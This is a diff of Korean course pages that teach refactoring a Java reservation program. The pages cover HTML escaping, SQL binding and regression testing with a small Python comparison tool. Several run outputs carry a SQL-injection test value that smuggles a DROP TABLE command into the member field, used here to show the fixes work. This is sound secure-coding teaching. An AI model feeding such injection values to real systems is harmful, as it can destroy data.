+  3단계 &amp; → &amp;amp;   &amp;amp;lt;b&amp;amp;gt;   ← 화면에 &amp;lt;b&amp;gt; 라고 찍힙니다</code></p>
+
+  <p>앞서 만들어 둔 <code>&amp;</code> 를 다시 바꾸게 되어 두 번 처리됩니다.
+     차례 하나 때문에 결과가 달라지는 자리이니 <code>&amp;</code> 를 맨 앞에 두십시오.</p>
+
+  <h5>절차 4 — 찍는 자리마다 씌운다</h5>
+
+  <p class="cmdline"><code>private static void printAccepted(String name, String member, String day, String time) {
+    System.out.println("&lt;div&gt;예약되었습니다 : " + Html.escape(name) + " "
+        + Html.escape(day) + " " + Html.escape(time) + "&lt;/div&gt;");
+    System.out.println("&lt;div&gt;신청자 : " + Html.escape(member) + "&lt;/div&gt;");
+    System.out.println("&lt;div class='sum'&gt;" + Html.escape(name) + " / " + Html.escape(day)
+        + " / " + Html.escape(time) + " / " + Html.escape(member)
+        + " / 누적 " + acceptedCount + "건&lt;/div&gt;");
+}
+
+private static void printError(String message) {
+    System.out.println("&lt;div class='err'&gt;" + Html.escape(message) + "&lt;/div&gt;");
+}</code></p>
+
+  <p><code>acceptedCount</code> 에는 안 씌웠습니다. 숫자라 태그가 될 수 없기 때문입니다.</p>
+
+  <h5>절차 5 — 컴파일하고 돌린다</h5>
+
+  <p class="cmdline"><code>&gt; javac -encoding utf-8 -proc:none -d step2\classes step2\src\*.java
+&gt; java -Dstdout.encoding=utf-8 -cp step2\classes ReservationConsole
+...
+&lt;div&gt;신청자 : M0005&amp;#39;; DROP TABLE reservation; --&lt;/div&gt;
+&lt;div class='sum'&gt;체육관 A / 2026-10-03 / 11:00 / M0005&amp;#39;; DROP TABLE reservation; -- / 누적 3건&lt;/div&gt;
+처리 건수 : 3</code></p>
+
+  <p>작은따옴표 자리에 <code>&amp;#39;</code> 가 들어갔습니다.
+     브라우저는 이 여섯 글자를 따옴표 하나로 그려 주므로 사람 눈에는 똑같아 보입니다.</p>
+
+  <h5>절차 6 — 태그를 넣어 시험해 본다</h5>
+
+  <p class="cmdline"><code>main 의 마지막 호출을 잠깐 바꿔 봅니다
+
+  process("&lt;b&gt;굵게&lt;/b&gt;", "F01", "2026-10-04", "12:00");
+
+씌우기 전
+  &lt;div&gt;신청자 : &lt;b&gt;굵게&lt;/b&gt;&lt;/div&gt;        ← 브라우저가 굵게 그립니다
+
+씌운 뒤
+  &lt;div&gt;신청자 : &amp;lt;b&amp;gt;굵게&amp;lt;/b&amp;gt;&lt;/div&gt;  ← 글자 그대로 보입니다
+
+확인했으면 원래 호출로 되돌리십시오</code></p>
+
+  <div class="note">되돌리는 것을 잊지 마십시오.
+    호출을 바꿔 둔 채로 두면 출력이 네 줄 늘어서 회귀 시험 결과가 달라집니다.
+    시험하려고 잠깐 건드린 것과 고친 것을 섞으면 실습 14 에서 설명할 수 없는 줄이 생깁니다.
+  </div>
+
+  <h5>절차 7 — 바뀐 줄을 센다</h5>
+
+  <p class="cmdline"><code>&gt; java -Dstdout.encoding=utf-8 -cp step2\classes ReservationConsole &gt; step2\출력.txt
+&gt; powershell -c "(Compare-Object (Get-Content step1\출력.txt) (Get-Content step2\출력.txt)).Count"
+10</code></p>
+
+  <p>실습 12 에서 여섯이었는데 열이 되었습니다.
+     SQL 세 줄에 화면 두 줄이 더해졌고, <code>Compare-Object</code> 가 없어진 줄과 생긴 줄을 따로 세서 두 배로 나옵니다.</p>
+
+  <h5>절차 8 — 도구를 돌린다</h5>
+
+  <p class="cmdline"><code>&gt; python 보안약점.py step2\src
+ReservationConsole.java    45  XSS   입력을 HTML 에 그대로 붙입니다
+ReservationConsole.java    51  XSS   입력을 HTML 에 그대로 붙입니다
+지적 2건</code></p>
+
+  <p>고쳤는데도 둘이 남았습니다.
+     두 줄에 <code>Html.escape</code> 가 붙어 있는 것을 도구가 알아보지 못합니다.
+     규칙이 보는 것은 꺾쇠로 끝나는 문자열 다음에 무엇이 오느냐뿐이고, 그것이 무슨 함수인지는 따지지 않습니다.</p>
+
+  <div class="warn">실습 8 에서는 고쳐야 할 줄을 못 찾았고 여기서는 고친 줄을 잡습니다.
+    미탐과 오탐이 같은 규칙에서 나옵니다.
+    글자 모양만 보는 도구는 이 둘을 피할 수 없고, 피하려면 코드의 뜻을 읽어야 합니다.
+    <b>도구는 볼 자리를 좁혀 줄 뿐이고 판정은 사람이 합니다.</b>
+  </div>
+
+  <h5>절차 9 — 결과서를 닫는다</h5>
+
+  <p class="cmdline"><code>분석\보안약점.md 에 칸을 더합니다
+
+| 줄 | 약점 | 도구가 찾았나 | 어떻게 막았나 | 확인 |
+|-----|------|---------------|---------------|------|
+| 77 | SQL 삽입 | 예 | 바인딩으로 바꿈 | 실행 화면 |
+| 78 | SQL 삽입 | 예 | 위와 같음 | 실행 화면 |
+| 82 | XSS | 예 | Html.escape | 실행 화면 |
+| 83 | XSS | 아니오 | Html.escape | 실행 화면 |
+| 84 | XSS | 예 | Html.escape | 실행 화면 |
+| 87 | XSS | 예 | Html.escape | 실행 화면 |</code></p>
+
+  <p>83번 줄이 목록에 들어 있는지 확인하십시오. 도구가 안 찾은 줄이라 사람이 안 넣으면 빠집니다.</p>
+
+  <h5>절차 10 — 커밋한다</h5>
+
+  <p class="cmdline"><code>&gt; git add step2
+&gt; git commit -m "보안 조치 — SQL 바인딩 · HTML 이스케이프 (출력 5줄 변경)"
+&gt; git log --oneline
+b2c1d09 보안 조치 — SQL 바인딩 · HTML 이스케이프 (출력 5줄 변경)
+a71f3e4 구조 개선 — 메서드 추출 · 이동 · 임시 변수 정리 (기능 동일)
+3f9a2c1 리팩토링 전 — 고칠 코드와 실행 결과</code></p>
+
+  <p>커밋 메시지에 몇 줄이 바뀌는지를 적어 두면 되짚을 때 편합니다.
+     세 커밋이 이 교과의 결과물을 가장 짧게 요약한 것입니다.</p>
+
+  <h5>안 될 때 볼 곳</h5>
+
+  <table class="wide">
+    <tr><th style="width:330px">이런 일이 생기면</th><th>볼 곳</th></tr>
+    <tr><td>화면에 <code>&amp;amp;lt;</code> 가 찍힌다</td>
+        <td><code>&amp;</code> 를 맨 앞에서 안 바꾼 것입니다</td></tr>
+    <tr><td>바뀐 줄이 10 이 아니다</td>
+        <td>절차 6 의 호출을 안 되돌렸는지 보십시오</td></tr>
+    <tr><td>보안 지적이 안 사라진다</td>
+        <td>사라지지 않습니다. 절차 8 을 읽으십시오</td></tr>
+    <tr><td>숫자에도 씌워야 하나</td>
+        <td>안 해도 됩니다. 다만 문자열로 받았다면 씌우십시오</td></tr>
+    <tr><td>커밋 해시가 다르다</td>
+        <td>다릅니다. 순서와 메시지만 맞으면 됩니다</td></tr>
+  </table>
+
+  <p><b>제출물</b> — 고칠 줄 목록 넷, <code>Html.java</code>, 순서를 확인한 기록,
+     씌운 <code>printAccepted</code>, 실행 화면, 태그 시험 결과,
+     바뀐 줄 수, 보안약점 화면, 닫은 <code>보안약점.md</code>, <code>git log</code></p>
+
+  <p><b>스스로 확인</b> —
+     ① 도구가 못 찾은 줄까지 넷을 다 고쳤습니까
+     ② <code>&amp;</code> 를 맨 먼저 바꿨습니까
+     ③ 태그를 넣어 보고 되돌렸습니까
+     ④ 보안 조치로 커밋을 따로 끊었습니까</p>
+</div>
+      </div>
+</div>
+
+<h3 class="lv">레벨 5 · 기능 확인 <span>능력단위요소 ③ · 안 망가뜨렸는지 증명합니다</span></h3>
+
+<div class="step" id="st14">
+      <h3><i>14</i>회귀 테스트</h3>
+      <aside class="side">
+        <p class="pt">고치기 전후를 견줍니다.</p>
+        <b class="sh">근거</b>
+        <p class="v">학습모듈 3-2</p>
+        <b class="sh">용어</b>
+        <p class="v">회귀 테스트 · xUnit</p>
+      </aside>
+      <div class="bd">
+
+<h4>회귀 테스트가 무엇인가</h4>
+
+<p>고친 뒤에 예전에 되던 것이 그대로 되는지 보는 시험입니다.
+   새 기능이 제대로 도는지 보는 시험과는 목적이 다릅니다.
+   여기서 찾으려는 것은 「고치다가 망가뜨린 것」입니다.</p>
+
+<table class="wide">
+  <tr><th style="width:150px">종류</th><th>무엇을 다시 도나</th></tr>
+  <tr><td>전체 재시험</td><td>모든 시험을 다 돕니다. 확실하지만 오래 걸립니다</td></tr>
+  <tr><td>선택 재시험</td><td>고친 자리와 얽힌 것만 돕니다</td></tr>
+  <tr><td>우선순위 재시험</td><td>중요한 것부터 돌고 시간이 되는 데까지 합니다</td></tr>
+</table>
+
+<p>우리 프로그램은 작아서 전체 재시험을 돌려도 몇 초면 끝납니다.</p>
+
+<h4>견주는 도구를 만듭니다</h4>
+
+<p class="cmdline"><code>도구\회귀테스트.py
+
+import subprocess, sys
+
+def run(classes):
+    r = subprocess.run(["java", "-Dstdout.encoding=utf-8", "-cp", classes,
+                        "ReservationConsole"],
+                       capture_output=True, text=True, encoding="utf-8")
+    return r.stdout.splitlines()
+
+앞 = run(sys.argv[1])
+뒤 = run(sys.argv[2])
+
+차이 = 0
+for i in range(max(len(앞), len(뒤))):
+    a = 앞[i] if i &lt; len(앞) else "(없음)"
+    b = 뒤[i] if i &lt; len(뒤) else "(없음)"
+    if a == b:
+        print(f"{i+1:&gt;4}  같음  {a[:74]}")
+    else:
+        차이 += 1
+        print(f"{i+1:&gt;4}  다름  앞 {a[:70]}")
+        print(f"{'':&gt;4}        뒤 {b[:70]}")
+print(f"줄 {max(len(앞), len(뒤))}개 · 다른 줄 {차이}개")</code></p>
+
+<p>두 판을 각각 돌려서 화면에 찍힌 줄을 차례대로 맞춰 봅니다.
+   화면 출력이 이 프로그램의 유일한 결과물이라 이것만 견주면 충분합니다.</p>
+
+<h4>구조 개선 구간을 시험합니다</h4>
+
+<p class="cmdline"><code>&gt; python 회귀테스트.py before\classes step1a\classes
+줄 15개 · 다른 줄 0개
+■ 기능이 그대로입니다
+
+&gt; python 회귀테스트.py before\classes step1b\classes
+줄 15개 · 다른 줄 0개
+■ 기능이 그대로입니다
+
+&gt; python 회귀테스트.py before\classes step1\classes
+줄 15개 · 다른 줄 0개
+■ 기능이 그대로입니다</code></p>
+
+<p>세 번 다 0개입니다. 메서드를 열넷으로 쪼개고 클래스를 셋으로 나눴는데 화면은 한 글자도 안 바뀌었습니다.</p>
+
+<h4>보안 조치 구간을 시험합니다</h4>
+
+<p class="cmdline"><code>&gt; python 회귀테스트.py step1\classes step2\classes
+  11  다름  앞 [SQL] INSERT INTO reservation VALUES ('M0005'; DROP TABLE reservation;
+            뒤 [SQL] INSERT INTO reservation VALUES (?, ?, ?)  &lt;- [M0005'; DROP TABLE
+  13  다름  앞 &lt;div&gt;신청자 : M0005'; DROP TABLE reservation; --&lt;/div&gt;
+            뒤 &lt;div&gt;신청자 : M0005&amp;#39;; DROP TABLE reservation; --&lt;/div&gt;
+  14  다름  앞 &lt;div class='sum'&gt;체육관 A / 2026-10-03 / 11:00 / M0005'; DROP TABLE reser
+            뒤 &lt;div class='sum'&gt;체육관 A / 2026-10-03 / 11:00 / M0005&amp;#39;; DROP TABLE r
+줄 15개 · 다른 줄 5개
+■ 바뀐 줄이 5개 — 의도한 것인지 확인하십시오</code></p>
+
+<h4>바뀐 줄을 설명합니다</h4>
+
+<p class="cmdline"><code>분석\회귀시험결과.md
+
+| 줄 | 무엇이 바뀌었나 | 의도한 것인가 | 어느 실습 |
+|-----|-----------------|---------------|-----------|
+| 1 | SQL 이 바인딩 꼴로 | 예 | 12 |
+| 5 | 위와 같음 | 예 | 12 |
+| 11 | 위와 같음 | 예 | 12 |
+| 13 | 따옴표가 &amp;#39; 로 | 예 | 13 |
+| 14 | 위와 같음 | 예 | 13 |
+
+바뀌지 않은 열 줄 — 정상 예약 · 오류 두 건 · 건수 요약</code></p>
+
+<div class="warn">다섯 줄이 다 「예」인 것을 확인하는 데까지가 시험입니다.
+  숫자만 보고 「보안 조치를 했으니 바뀌는 게 당연하다」고 넘기면 안 됩니다.
+  다섯 줄 가운데 하나가 오류 메시지였다면 그것은 의도한 것이 없고 사고에 가깝습니다.
+  <b>바뀐 줄을 한 줄씩 설명할 수 없다면 아직 끝난 것이 아닙니다.</b>
+</div>
+
+<h4>실무에서 쓰는 틀</h4>
+
+<p class="cmdline"><code>xUnit 계열     JUnit(자바) · CppUnit(C++) · NUnit(.NET) · PyUnit(파이썬)
+
+JUnit 에서 자주 쓰는 것
+  @Test              시험 메서드임을 표시
+  @BeforeEach        시험마다 앞서 도는 준비
+  @AfterEach         시험마다 뒤에 도는 정리
+  assertEquals(a, b) 두 값이 같은지 봅니다
+  assertNull(x)      비었는지 봅니다</code></p>
+
+<p>우리 도구는 화면 출력을 통째로 견주는 방식이라 어디가 왜 틀렸는지까지는 말해 주지 않습니다.
+   JUnit 을 쓰면 검사마다 이름이 붙어서 무엇이 깨졌는지 바로 드러납니다.
+   테스트 교과에서 그 틀을 따로 다룹니다.</p>
+      <div class="lab">
+  <b class="t">실습 14</b>
+  <b>회귀테스트.py 를 만들어 두 구간을 시험한다</b>
+
+  <p><b>목적</b> — 지금까지는 <code>Compare-Object</code> 로 줄 수만 세었습니다.
+     어느 줄이 어떻게 달라졌는지 나란히 보여 주는 도구를 만들고, 구간마다 다른 판정을 내립니다.</p>
+
+  <h5>절차 1 — 두 판을 돌리는 부분을 쓴다</h5>
+
+  <p class="cmdline"><code>도구\회귀테스트.py
+
+# -*- coding: utf-8 -*-
+"""고치기 전과 뒤의 실행 결과를 줄 단위로 견준다."""
+import subprocess, sys
+
+def run(classes):
+    r = subprocess.run(["java", "-Dstdout.encoding=utf-8", "-cp", classes,
+                        "ReservationConsole"],
+                       capture_output=True, text=True, encoding="utf-8")
+    return r.stdout.splitlines()
+
+앞 = run(sys.argv[1] if len(sys.argv) &gt; 1 else "before/classes")
+뒤 = run(sys.argv[2] if len(sys.argv) &gt; 2 else "step1/classes")</code></p>
+
+  <p>소스를 읽는 것이 아니고 컴파일된 결과를 돌립니다.
+     겉으로 드러나는 동작을 견주는 것이 목적이기 때문입니다.</p>
+
+  <h5>절차 2 — 줄을 맞춰 보는 부분을 쓴다</h5>
+
+  <p class="cmdline"><code>print(f"{'줄':&gt;4}  {'판정':&lt;6}{'내용'}")
+print("-" * 92)
+차이 = 0
+for i in range(max(len(앞), len(뒤))):
+    a = 앞[i] if i &lt; len(앞) else "(없음)"
+    b = 뒤[i] if i &lt; len(뒤) else "(없음)"
+    if a == b:
+        print(f"{i+1:&gt;4}  {'같음':&lt;6}{a[:74]}")
+    else:
+        차이 += 1
+        print(f"{i+1:&gt;4}  {'다름':&lt;6}앞 {a[:70]}")
+        print(f"{'':&gt;4}  {'':&lt;6}뒤 {b[:70]}")
+print("-" * 92)
+print(f"줄 {max(len(앞), len(뒤))}개 · 다른 줄 {차이}개")
+print("■ 기능이 그대로입니다" if 차이 == 0 else f"■ 바뀐 줄이 {차이}개 — 의도한 것인지 확인하십시오")</code></p>
+
+  <p>줄 수가 다를 수 있으므로 긴 쪽에 맞추고 없는 자리는 「(없음)」으로 채웁니다.
+     이렇게 해 두면 줄이 통째로 늘거나 줄었을 때도 어디서부터인지 보입니다.</p>
+
+  <h5>절차 3 — 구조 개선 구간을 시험한다</h5>
+
+  <p class="cmdline"><code>&gt; python 회귀테스트.py before\classes step1a\classes
+줄 15개 · 다른 줄 0개
+■ 기능이 그대로입니다
+
+&gt; python 회귀테스트.py before\classes step1b\classes
+줄 15개 · 다른 줄 0개
+■ 기능이 그대로입니다
+
+&gt; python 회귀테스트.py before\classes step1\classes
+줄 15개 · 다른 줄 0개
+■ 기능이 그대로입니다</code></p>
+
+  <p>세 번 다 0개입니다. 화면을 <code>화면\04_회귀_구조개선.png</code> 로 남기십시오.</p>
+
+  <h5>절차 4 — 보안 조치 구간을 시험한다</h5>
+
+  <p class="cmdline"><code>&gt; python 회귀테스트.py step1\classes step2\classes
+   1  다름  앞 [SQL] INSERT INTO reservation VALUES ('M0001', 'F01', '2026-10-01 09:00')
+            뒤 [SQL] INSERT INTO reservation VALUES (?, ?, ?)  &lt;- [M0001, F01, 2026-10-
+   2  같음  &lt;div&gt;예약되었습니다 : 체육관 A 2026-10-01 09:00&lt;/div&gt;
+   3  같음  &lt;div&gt;신청자 : M0001&lt;/div&gt;
+   4  같음  &lt;div class='sum'&gt;체육관 A / 2026-10-01 / 09:00 / M0001 / 누적 1건&lt;/div&gt;
+   5  다름  앞 [SQL] INSERT INTO reservation VALUES ('M0002', 'F01', '2026-10-01 09:00')
+            뒤 [SQL] INSERT INTO reservation VALUES (?, ?, ?)  &lt;- [M0002, F01, 2026-10-
+   6  같음  &lt;div&gt;예약되었습니다 : 체육관 A 2026-10-01 09:00&lt;/div&gt;
+   7  같음  &lt;div&gt;신청자 : M0002&lt;/div&gt;
+   8  같음  &lt;div class='sum'&gt;체육관 A / 2026-10-01 / 09:00 / M0002 / 누적 2건&lt;/div&gt;
+   9  같음  &lt;div class='err'&gt;없는 시설입니다 : F99&lt;/div&gt;
+  10  같음  &lt;div class='err'&gt;날짜가 올바르지 않습니다 : 2026-13-01&lt;/div&gt;
+  11  다름  앞 [SQL] INSERT INTO reservation VALUES ('M0005'; DROP TABLE reservation;
+            뒤 [SQL] INSERT INTO reservation VALUES (?, ?, ?)  &lt;- [M0005'; DROP TABLE
+  12  같음  &lt;div&gt;예약되었습니다 : 체육관 A 2026-10-03 11:00&lt;/div&gt;
+  13  다름  앞 &lt;div&gt;신청자 : M0005'; DROP TABLE reservation; --&lt;/div&gt;
+            뒤 &lt;div&gt;신청자 : M0005&amp;#39;; DROP TABLE reservation; --&lt;/div&gt;
+  14  다름  앞 &lt;div class='sum'&gt;체육관 A / 2026-10-03 / 11:00 / M0005'; DROP TABLE reser
+            뒤 &lt;div class='sum'&gt;체육관 A / 2026-10-03 / 11:00 / M0005&amp;#39;; DROP TABLE r
+  15  같음  처리 건수 : 3
+--------------------------------------------------------------------------------------------
+줄 15개 · 다른 줄 5개
+■ 바뀐 줄이 5개 — 의도한 것인지 확인하십시오</code></p>
+
+  <p>화면을 <code>화면\05_회귀_보안조치.png</code> 로 남기십시오.</p>
+
+  <h5>절차 5 — 안 바뀐 줄을 먼저 본다</h5>
+
+  <p class="cmdline"><code>같음으로 나온 열 줄
+
+  2 · 6 · 12   예약되었습니다
+  3 · 7        신청자 (M0001 · M0002)
+  4 · 8        누적
+  9 · 10       오류 메시지 둘
+  15           처리 건수</code></p>
+
+  <p>공격 문자열이 안 들어간 줄은 이스케이프를 씌워도 그대로입니다.
+     평범한 값에는 바꿀 글자가 없기 때문입니다.
+     보통 쓰는 사람에게는 아무 차이가 없고 공격에만 걸린다는 뜻입니다.</p>
+
+  <h5>절차 6 — 바뀐 다섯 줄을 설명한다</h5>
+
+  <p class="cmdline"><code>분석\회귀시험결과.md
+
+## 구간 1 — 구조 개선 (before → step1)
+다른 줄 0개. 기능 보존 확인.
+
+## 구간 2 — 보안 조치 (step1 → step2)
+다른 줄 5개.
+
+| 줄 | 무엇이 바뀌었나 | 의도한 것인가 | 어느 실습 |
+|-----|-----------------|---------------|-----------|
+| 1 | SQL 이 바인딩 꼴로 | 예 | 12 |
+| 5 | 위와 같음 | 예 | 12 |
+| 11 | 위와 같음 | 예 | 12 |
+| 13 | 따옴표가 &amp;#39; 로 | 예 | 13 |
+| 14 | 위와 같음 | 예 | 13 |
+
+바뀌지 않은 열 줄 — 정상 예약 여섯 · 오류 둘 · 누적 하나 · 건수 하나</code></p>
+
+  <div class="warn">표의 「의도한 것인가」 칸이 전부 채워져야 시험이 끝납니다.
+    바뀐 줄이 다섯이라는 숫자만 보고 넘어가면 그 칸을 채울 수 없습니다.
+    만약 오류 메시지 줄이 그 다섯에 끼어 있었다면 우리가 모르는 사이에 동작이 달라진 것인데,
+    숫자만 세는 눈으로는 그것이 보이지 않습니다.
+  </div>
+
+  <h5>절차 7 — 일부러 망가뜨려 시험이 잡는지 본다</h5>
+
+  <p class="cmdline"><code>step2 의 검사 순서를 바꿔 봅니다
+
+    if (isBlank(facility)) return "시설 번호가 없습니다";
+    if (isBlank(member))   return "회원 번호가 없습니다";
+
+&gt; javac -encoding utf-8 -proc:none -d step2\classes step2\src\*.java
+&gt; python 회귀테스트.py step1\classes step2\classes
+줄 15개 · 다른 줄 5개
+
+똑같이 5개입니다. 우리 시험이 이 실수를 못 잡습니다</code></p>
+
+  <p>두 검사 모두 걸리는 입력이 <code>main</code> 에 없어서 결과가 안 달라집니다.
+     시험이 통과한다고 안 망가졌다는 뜻은 아니라는 것을 여기서 봅니다.
+     확인했으면 순서를 되돌리십시오.</p>
+
+  <h5>절차 8 — 못 잡는 자리를 적는다</h5>
+
+  <p class="cmdline"><code>분석\시험한계.md
+
+| 우리 시험이 못 잡는 것 | 왜 | 어떻게 보완하나 |
+|------------------------|-----|-----------------|
+| 입력에 없는 경우의 동작 | main 에 그 입력이 없음 | 입력을 늘린다 |
+| 화면에 안 찍히는 값 | 출력만 견주기 때문 | 돌려주는 값을 시험한다 |
+| 어느 검사에서 걸렸는지 | 메시지만 보기 때문 | 검사마다 시험을 만든다 |
+| 성능이 나빠진 것 | 시간을 안 잼 | 시간을 잰다 |</code></p>
+
+  <p>첫 줄이 가장 흔합니다. 입력 다섯 개로 열다섯 줄을 견주는 시험이라 빈틈이 넓습니다.</p>
+
+  <h5>절차 9 — 입력을 늘려 본다</h5>
+
+  <p class="cmdline"><code>step1 과 step2 의 main 에 한 줄씩 더합니다
+
+  process("", "", "2026-10-05", "13:00");
+
+&gt; python 회귀테스트.py step1\classes step2\classes
+...
+  15  다름  앞 &lt;div class='err'&gt;회원 번호가 없습니다&lt;/div&gt;
+            뒤 &lt;div class='err'&gt;시설 번호가 없습니다&lt;/div&gt;
+  16  같음  처리 건수 : 3
+--------------------------------------------------------------------------------------------
+줄 16개 · 다른 줄 6개
+■ 바뀐 줄이 6개 — 의도한 것인지 확인하십시오</code></p>
+
+  <p>열다섯째 줄에서 잡혔습니다. 회원 번호와 시설 번호가 둘 다 빈 입력이라 순서가 드러난 것입니다.
+     입력 하나를 늘리는 것으로 아까 못 잡던 실수를 잡을 수 있습니다.
+     시험의 빈틈은 대개 입력이 모자라서 생깁니다.
+     확인했으면 더한 줄을 지우고 판을 원래대로 맞춰 두십시오.</p>
+
+  <h5>절차 10 — xUnit 계열을 알아 둔다</h5>
+
+  <p class="cmdline"><code>JUnit(자바) · CppUnit(C++) · NUnit(.NET) · PyUnit(파이썬)
+
+JUnit 에서 자주 쓰는 것
+  @Test              시험 메서드임을 표시
+  @BeforeEach        시험마다 앞서 도는 준비
+  @AfterEach         시험마다 뒤에 도는 정리
+  assertEquals(a, b) 두 값이 같은지 봅니다
+  assertNull(x)      비었는지 봅니다</code></p>
+
+  <p>우리 도구는 화면 전체를 견주므로 어디가 왜 틀렸는지까지는 말해 주지 않습니다.
+     JUnit 을 쓰면 검사마다 이름이 붙어서 무엇이 깨졌는지 바로 드러나고,
+     방금 본 검사 순서 문제도 <code>checkMember 가 먼저 걸린다</code> 는 시험 하나로 잡힙니다.</p>
+
+  <h5>안 될 때 볼 곳</h5>
+
+  <table class="wide">
+    <tr><th style="width:330px">이런 일이 생기면</th><th>볼 곳</th></tr>
+    <tr><td>한글이 물음표로 나온다</td>
+        <td><code>encoding="utf-8"</code> 을 <code>subprocess.run</code> 에 넣었는지 보십시오</td></tr>
+    <tr><td><code>java</code> 를 못 찾는다</td>
+        <td>경로를 <code>step1\classes</code> 처럼 폴더로 주어야 합니다</td></tr>
+    <tr><td>줄이 잘려서 안 보인다</td>
+        <td><code>[:70]</code> 을 늘리십시오</td></tr>
+    <tr><td>구조 개선에서 0개가 안 나온다</td>
+        <td>실습 9 ~ 11 어딘가에서 기능을 바꾼 것입니다</td></tr>
+    <tr><td>보안 조치에서 5개가 아니다</td>
+        <td>실습 13 절차 6 의 호출을 안 되돌렸는지 보십시오</td></tr>
+  </table>
+
+  <p><b>제출물</b> — <code>회귀테스트.py</code>,
+     화면 <code>04_회귀_구조개선.png</code> 와 <code>05_회귀_보안조치.png</code>,
+     안 바뀐 줄 정리, <code>회귀시험결과.md</code>,
+     일부러 망가뜨린 시험 결과, <code>시험한계.md</code>, 입력을 늘린 결과</p>
+
+  <p><b>스스로 확인</b> —
+     ① 구조 개선 구간에서 0개가 나왔습니까
+     ② 보안 조치 구간의 다섯 줄을 하나씩 설명했습니까
+     ③ 시험이 못 잡는 실수를 직접 만들어 봤습니까
+     ④ 못 잡는 자리를 적어 두었습니까</p>
+</div>
+      </div>
+</div>
+
+<div class="step" id="st15">
+      <h3><i>15</i>체크리스트 대조</h3>
+      <aside class="side">
+        <p class="pt">여덟 줄을 하나씩 닫습니다.</p>
+        <b class="sh">근거</b>
+        <p class="v">학습모듈 3-2</p>
+        <b class="sh">용어</b>
+        <p class="v">체크리스트 · 완전성 검증</p>
+      </aside>
+      <div class="bd">
+
+<h4>실습 5 에서 만든 여덟 줄을 꺼냅니다</h4>
+
+<p class="cmdline"><code>분석\체크리스트결과.md
+
+| 번호 | 확인할 것 | 통과 조건 | 결과 | 판정 |
+|------|-----------|-----------|------|------|
+| 1 | 기능이 그대로인가 | 다른 줄 0개 | 0개 (before→step1) | 통과 |
+| 2 | 컴파일되는가 | 오류 0 | 오류 0 | 통과 |
+| 3 | 개발 표준을 지키는가 | 지적 0건 | step1 0건 · step2 1건 | 조건부 |
+| 4 | 죽은 코드가 없는가 | 진짜 지적 0건 | 진짜 2건 (text · values) | 미달 |
+| 5 | 보안 약점이 없는가 | 진짜 지적 0건 | 진짜 0건 (오탐 2건) | 통과 |
+| 6 | 복잡도가 목표 안인가 | 10 이하 | 6 | 통과 |
+| 7 | 메서드가 짧은가 | 30줄 이하 | 19줄 | 통과 |
+| 8 | 커밋이 나뉘어 있는가 | 구조와 보안이 따로 | 커밋 2개 | 통과 |</code></p>
+
+<p>여덟 줄 가운데 여섯이 통과, 하나가 조건부, 하나가 미달입니다.</p>
+
+<h4>미달 한 줄을 처리합니다</h4>
+
+<p class="cmdline"><code>4번 — 안 쓰는 메서드 둘
+
+  ReservationSql.text()     쓸 데가 없습니다
+  ReservationSql.values()   쓸 데가 없습니다
+
+둘을 지우고 다시 돌립니다
+
+&gt; python 죽은코드.py step2\src
+Html.java                  12  닿을 수 없는 줄   .replace("&lt;", "&amp;lt;")
+ReservationConsole.java    33  닿을 수 없는 줄   .bind(member)
+ReservationSql.java        18  안 쓰는 메서드    toString
+지적 3건  — 셋 다 오탐</code></p>
+
+<p>지적 건수는 5에서 3으로 줄었고 남은 셋은 다 오탐입니다.
+   도구가 0건이 되게 만드는 것이 목표가 아니라, 남은 지적을 설명할 수 있게 만드는 것이 목표입니다.</p>
+
+<h4>조건부 한 줄을 처리합니다</h4>
+
+<p class="cmdline"><code>3번 — step2 의 101자 줄
+
+private static ReservationSql buildSql(String member, String facility, String day, String time) {
+
+두 줄로 나눕니다
+
+private static ReservationSql buildSql(String member, String facility,
+                                       String day, String time) {</code></p>
+
+<p>나누고 다시 돌리면 0건이 됩니다. 인자가 넷이나 되는 것이 근본 원인인데, 그것을 줄이려면 인자를 객체로 묶어야 합니다.</p>
+
+<div class="note">인자 넷을 <code>ReservationRequest</code> 같은 객체 하나로 묶는 기법이 있습니다.
+  여기서는 안 합니다. 고칠 자리를 발견했다고 다 고치기 시작하면 끝이 없고,
+  그러다 보면 회귀 테스트가 한꺼번에 여러 줄에서 깨집니다.
+  기준서에 적은 목표를 채웠으면 멈추고, 남은 것은 다음 차례로 적어 둡니다.
+</div>
+
+<h4>다음 차례로 넘길 것을 적습니다</h4>
+
+<p class="cmdline"><code>분석\다음차례.md
+
+| 무엇 | 왜 지금 안 하나 | 언제 |
+|------|-----------------|------|
+| 인자 넷을 객체로 묶기 | 이번 목표에 없음 | 기능 추가 때 같이 |
+| 메모리 목록을 DB 로 | SQL 응용 교과에서 | 다음 교과 |
+| 도구를 구문 해석 방식으로 | 정규식의 한계가 뚜렷함 | 여력이 있을 때 |
+| JUnit 도입 | 시험 틀이 따로 필요함 | 테스트 교과 |</code></p>
+
+<p>적어 두지 않으면 잊어버리고, 잊어버리면 다음 사람이 같은 자리를 다시 발견합니다.</p>
+
+<h4>최종 판정을 적습니다</h4>
+
+<p class="cmdline"><code>체크리스트 8줄 가운데
+  통과 8 · 조건부 0 · 미달 0   (조치 뒤)
+
+품질 목표
+  최대 순환 복잡도   19 → 6      목표 10 이하   달성
+  가장 긴 메서드     64줄 → 19줄  목표 30줄 이하  달성
+  표준 검사 지적     5건 → 0건    목표 0건       달성
+  죽은 코드         3건 → 0건    목표 0건       달성 (오탐 제외)
+  보안 약점         5건 → 0건    목표 0건       달성
+  회귀 시험         0개 / 5개     구간별 판정     달성</code></p>
+      <div class="lab">
+  <b class="t">실습 15</b>
+  <b>체크리스트를 대조하고 남은 것을 처리한다</b>
+
+  <p><b>목적</b> — 실습 5 에서 만든 여덟 줄을 하나씩 닫습니다.
+     통과가 아닌 줄은 조치하거나, 조치하지 않기로 하고 그 까닭을 적습니다.
+     둘 다 안 하고 넘어가는 줄이 없어야 끝난 것입니다.</p>
+
+  <h5>절차 1 — 여덟 줄을 한 번에 돌린다</h5>
+
+  <p class="cmdline"><code>&gt; python 회귀테스트.py before\classes step1\classes
+줄 15개 · 다른 줄 0개
+
+&gt; javac -encoding utf-8 -proc:none -d step2\classes step2\src\*.java
+(오류 없음)
+
+&gt; python 표준검사.py step2\src
+ReservationConsole.java    30  줄길이     101자          100자 이하
+지적 1건
+
+&gt; python 죽은코드.py step2\src
+Html.java                  12  닿을 수 없는 줄   .replace("&lt;", "&amp;lt;")
+ReservationConsole.java    32  닿을 수 없는 줄   .bind(member)
+ReservationSql.java        17  안 쓰는 메서드    text
+ReservationSql.java        21  안 쓰는 메서드    values
+ReservationSql.java        26  안 쓰는 메서드    toString
